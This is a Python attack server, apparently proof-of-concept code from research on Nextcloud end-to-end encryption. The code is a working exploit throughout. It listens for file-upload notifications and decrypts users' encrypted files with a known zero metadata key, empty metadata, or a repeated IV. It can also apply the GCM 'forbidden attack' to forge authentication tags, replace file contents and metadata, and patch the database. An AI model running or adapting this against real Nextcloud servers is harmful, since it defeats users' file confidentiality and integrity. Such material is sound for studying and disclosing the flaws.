from http.server import BaseHTTPRequestHandler, HTTPServer
import json
from helper import ServerPath, db
from e2ee import E2EE
from forbidden_attack import forbidden_attack
import base64
from Crypto.Hash import SHA1
import time
from pathlib import Path
from urllib.parse import urlparse
import argparse

hostName = "0.0.0.0"
serverPort = 5003
config_file = "/var/www/nextcloud/config/config.json"
ptxt_file = "/var/www/html/plaintext"

def save_decrypted(ptxt):
    with open(ptxt_file , "wb+") as f:
        f.write(ptxt)

class MyServer(BaseHTTPRequestHandler):        
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.send_header("Content-Length", str(0))
        self.end_headers()

    def do_POST(self):
        """
            The POST requests are generated by the Nextcloud server
            to notify the script when a file is added.
            Depending on the selected attack the file is decrypted
            using a known metadata key or exploiting the repeated IV. 
        """
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = json.loads(self.rfile.read(content_length)) # <--- Gets the data itself
        self._set_headers()
        self.wfile.flush() 
        
        print(f"Received:\n {post_data}\n")
        if post_data["type"] == "e2e_add_metadata_key":
            self.decrypt_known_metadatakey(post_data["uri"])

        if post_data["type"] == "e2e_repeated_iv":
            self.decrypt_repeated_iv(post_data["uri"])
        
        if post_data["type"] == "e2e_empty_metadata":
            self.decrypt_known_metadatakey(post_data["uri"])
           
        print("\n\n")

    def do_GET(self):
        """
            This is used to set the attack type from the web interface 
            at http://140.238.220.26/index.html.
        """
        query = urlparse(self.path).query
        attack = query.split("=")[1]
        attacks = {'1': "e2e_add_metadata_key",
                   '2': "e2e_empty_metadata",
                   '3': "e2e_repeated_iv"}

        if attack in ['1', '2', '3']:
            print(f"Setting attack to {attacks[attack]}")
            with open(config_file) as f:
                config =  json.load(f)
            config["attack"]["type"] = attacks[attack]
            with open(config_file, "w") as f:
                f.write(json.dumps(config, indent = 4))
        else:
            print("Attack not available")
        self.send_response(200)


    def decrypt_known_metadatakey(self, uri):
        time.sleep(1)
        with open(config_file) as f:
            config =  json.load(f)
        server_path = ServerPath(config)
        e2ee = E2EE(config, server_path)

        folder_name,file_name, uid = server_path.extractInfoFromUri(uri)
        file_path, _ = server_path.getRecentVersions(uri)
        file_path = file_path[0]
        metadata_path = server_path.metadataPath(folder_name)
        print(metadata_path)
        with open(metadata_path) as f:
            metadata = json.load(f)
        metadata = e2ee.decrypt_metadata(metadata, b"\x00"*16)
        ptxt = e2ee.decrypt_e2ee(metadata["files"][file_name], file_path)
        save_decrypted(ptxt)

    def decrypt_repeated_iv(self, uri):
        time.sleep(2)
    
        with open(config_file) as f:
            config =  json.load(f)
        server_path = ServerPath(config)
        e2ee = E2EE(config, server_path)

        folder_name, file_name, uid = server_path.extractInfoFromUri(uri)
        file_paths, metadata_paths = server_path.getRecentVersions(uri, n = 2)
        if len(file_paths) < 2:
            print(f"Receveid file {file_name}, waiting for a modification...")
            return

        with open(file_paths[0], "rb") as file1:
            ctxt1 = file1.read()
            iv1 = ctxt1[-16:]
            ctxt1 = ctxt1[:-16]
        with open(file_paths[1], "rb") as file2:
            ctxt2 = file2.read()  
            iv2 = ctxt2[-16:]
            ctxt2 = ctxt2[:-16]

        print(f"\nctxt1\n{ctxt1.hex()}\n")
        print(f"ctxt2\n{ctxt2.hex()}\n")
        try:
            decrypted, offset = e2ee.decrypt_repeated_iv(ctxt1, ctxt2)
            save_decrypted(decrypted)
        except:
            print("Could not decrypt...")
            print("\n")
            return

        if config["attack"]["forbiddenAttack"]:
            # Generate the new tag 
            with open(metadata_paths[0]) as file1:
                tag1 = base64.b64decode(json.load(file1)["files"][file_name]["authenticationTag"])
            with open(metadata_paths[1]) as file2:
                tag2 = base64.b64decode(json.load(file2)["files"][file_name]["authenticationTag"])
            print(f"Tag1\t{tag1}\nTag2\t{tag2}")

            ctxt, tag = forbidden_attack(ctxt1, ctxt2, tag1, tag2,
                                        decrypted, config["attack"]["targetPtxt"].encode(), offset)
            
            # Update folder metadata and file content
            file_path = server_path.E2EEFilePath(f"{folder_name}/{file_name}", uid)
            metadata_path = server_path.metadataPath(folder_name)
            print(f"file_path: {file_path}")
            print(f"metadata_path: {metadata_path}")
            print(f"ctxt: {ctxt}")
            print(f"tag:{base64.b64encode(tag).decode()}")
            with open(file_path, "wb") as f:
                f.write(ctxt + iv1)
            with open(metadata_path) as f:
                metadata = json.load(f)
            metadata["files"][file_name]["authenticationTag"] = base64.b64encode(tag).decode()
            with open(metadata_path, "w") as f:
                json.dump(metadata, f)
            
            # Update the database 
            hash = SHA1.new()
            hash.update(ctxt + iv1)
            database = db()
            database.update_file(file_name, hash.digest().hex())

if __name__ == "__main__":        
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('attack_type', 
                        choices=["e2e_add_metadata_key",
                                 "e2e_empty_metadata", 
                                 "e2e_repeated_iv",
                                 "off"])              
    attack_type = parser.parse_args().attack_type
    with open(config_file) as f:
        config =  json.load(f)
    config["attack"]["type"] = attack_type
    with open(config_file, "w") as f:
        f.write(json.dumps(config, indent = 4))
    if attack_type == "off":
        exit()
    webServer = HTTPServer((hostName, serverPort), MyServer)
    print("Server started http://%s:%s" % (hostName, serverPort))

    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        pass

    webServer.server_close()
    print("Server stopped.")
